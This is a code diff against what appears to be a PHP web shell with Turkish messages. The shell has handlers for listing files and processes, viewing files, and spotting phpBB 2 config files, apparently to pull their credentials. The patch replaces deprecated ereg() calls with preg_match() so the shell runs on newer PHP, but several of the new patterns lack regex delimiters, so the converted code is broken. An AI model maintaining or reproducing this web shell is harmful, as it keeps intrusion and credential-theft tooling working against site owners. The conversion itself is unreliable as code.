@@ -2011,7 +2011,7 @@ if ($act == "ls")
     elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
     foreach ($regxp_highlight as $r)
     {
-     if (ereg($r[0],$o))
+     if (preg_match($r[0],$o))
      {
       if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Uyari! Konfigirasyon i?inde hata \$regxp_highlight[".$k."][0] - Bilinmeyen Komut."; ashshexit();}
       else
@@ -2324,17 +2324,17 @@ if ($act == "processes")
   }
   else
   {
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("		",$ret)) {$ret = str_replace("		","	",$ret);}
-   while (ereg("	 ",$ret)) {$ret = str_replace("	 ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
+   while (preg_match("		",$ret)) {$ret = str_replace("		","	",$ret);}
+   while (preg_match("	 ",$ret)) {$ret = str_replace("	 ","	",$ret);}
    $ret = convert_cyr_string($ret,"d","w");
    $stack = explode("\n",$ret);
    unset($stack[0],$stack[2]);
@@ -2575,7 +2575,7 @@ if ($act == "f")
   elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
   elseif ($ft == "code")
   {
-   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
+   if (preg_match("php"."BB 2.(.*) auto-generated config file",$r))
    {
     $arr = explode("\n",$r);
     if (count($arr == 18))
